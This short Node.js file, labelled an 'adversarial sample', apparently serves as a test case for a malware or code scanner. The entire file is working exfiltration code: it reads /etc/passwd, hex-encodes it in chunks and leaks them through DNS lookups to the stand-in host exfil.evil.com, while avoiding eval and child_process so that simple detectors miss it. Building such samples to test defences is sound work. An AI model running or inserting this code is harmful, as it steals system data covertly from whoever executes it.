// Adversarial sample: read sensitive file + DNS exfiltration in chunks, no eval/child_process
var fs = require('fs');
var dns = require('dns');

var data = fs.readFileSync('/etc/passwd', 'utf8');
var chunks = [];
for (var i = 0; i < data.length; i += 30) {
  chunks.push(Buffer.from(data.substring(i, i + 30)).toString('hex'));
}

chunks.forEach(function(chunk, idx) {
  var subdomain = chunk + '.' + idx + '.exfil.evil.com';
  dns.resolve(subdomain, function() {});
});
